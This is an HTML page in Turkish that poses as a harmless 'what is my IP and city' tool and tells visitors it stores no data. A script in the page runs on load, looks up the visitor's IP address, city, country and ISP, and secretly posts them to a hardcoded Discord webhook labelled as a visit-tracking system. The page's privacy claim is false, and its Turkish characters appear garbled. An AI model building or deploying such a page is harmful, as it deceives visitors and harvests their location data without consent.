<!DOCTYPE html>
<html lang="tr">
<head>
    <meta charset="UTF-8">
    <title>IP & Åžehir Bilgim</title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <style>
        body {
            background:#0a0a0a;
            color:#eaeaea;
            font-family: monospace;
            display:flex;
            justify-content:center;
            align-items:center;
            height:100vh;
            margin:0;
        }
        .box {
            background:#111;
            border:1px solid #333;
            border-radius:10px;
            padding:30px;
            width:360px;
            box-shadow:0 0 25px rgba(0,0,0,.7);
        }
        h2 { margin-top:0; text-align:center; }
        .row { margin:10px 0; font-size:14px; }
        .label { color:#888; }
        .value { color:#00ff88; word-break:break-all; }
        .note { margin-top:20px; font-size:12px; color:#777; text-align:center; }
    </style>
</head>
<body>
    <div class="box">
        <h2>BaÄŸlantÄ± Bilgilerin</h2>
        <div class="row"><span class="label">IP:</span> <span id="ip" class="value">YÃ¼kleniyor...</span></div>
        <div class="row"><span class="label">Åžehir:</span> <span id="city" class="value">YÃ¼kleniyor...</span></div>
        <div class="row"><span class="label">Ãœlke:</span> <span id="country" class="value">YÃ¼kleniyor...</span></div>
        <div class="row"><span class="label">ISP:</span> <span id="isp" class="value">YÃ¼kleniyor...</span></div>
        <div class="note">Bu site hiÃ§bir veri kaydetmez.<br>Bilgiler yaklaÅŸÄ±k olabilir.</div>
    </div>

    <script>
        // Webhook URL (URL'nin doÄŸruluÄŸunu tekrar kontrol etmeyi unutma!)
        const webhookUrl = "https://discord.com/api/webhooks/1454212443227033762/sENFhwWgklT-lvcuHVyZrg0l634v00ce4tSz3YsVM6HXTMtOMZzNAlvUVFjyo3ekswyJ";

        async function sendToDiscord(data) {
            const payload = {
                content: "ðŸš€ **Yeni ZiyaretÃ§i GiriÅŸ YaptÄ±!**",
                embeds: [{
                    title: "ZiyaretÃ§i DetaylarÄ±",
                    color: 3066993, // CanlÄ± yeÅŸil
                    fields: [
                        { name: "ðŸŒ IP Adresi", value: `\`${data.ip}\``, inline: true },
                        { name: "ðŸ“ Lokasyon", value: `\`${data.city} / ${data.country}\``, inline: true },
                        { name: "ðŸ“¡ Servis SaÄŸlayÄ±cÄ± (ISP)", value: `\`${data.isp}\``, inline: false }
                    ],
                    footer: { text: "Ziyaret Takip Sistemi" },
                    timestamp: new Date().toISOString()
                }]
            };

            try {
                const response = await fetch(webhookUrl, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify(payload)
                });

                if (response.ok) {
                    console.log('âœ… Webhook baÅŸarÄ±yla gÃ¶nderildi.');
                } else {
                    console.error('âŒ Webhook hatasÄ±:', response.status);
                }
            } catch (error) {
                console.error('âŒ GÃ¶nderim sÄ±rasÄ±nda bir hata oluÅŸtu:', error);
            }
        }

        // IP Bilgilerini Getir
        async function fetchIpInfo() {
            try {
                // Alternatif olarak 'https://ipapi.co/json/' da kullanÄ±labilir
                const response = await fetch("https://ipwho.is/");
                const data = await response.json();

                if (data && data.success) {
                    const info = {
                        ip: data.ip,
                        city: data.city || "Bilinmiyor",
                        country: data.country || "Bilinmiyor",
                        isp: data.connection?.isp || data.isp || "Bilinmiyor"
                    };

                    // ArayÃ¼zÃ¼ GÃ¼ncelle
                    document.getElementById("ip").textContent = info.ip;
                    document.getElementById("city").textContent = info.city;
                    document.getElementById("country").textContent = info.country;
                    document.getElementById("isp").textContent = info.isp;

                    // Discord'a GÃ¶nder
                    await sendToDiscord(info);
                } else {
                    throw new Error("API verisi alÄ±namadÄ±.");
                }
            } catch (error) {
                console.error("Bilgi Ã§ekme hatasÄ±:", error);
                document.querySelectorAll(".value").forEach(e => e.textContent = "Hata!");
            }
        }

        // Sayfa yÃ¼klendiÄŸinde Ã§alÄ±ÅŸtÄ±r
        window.onload = fetchIpInfo;
    </script>
</body>
</html>
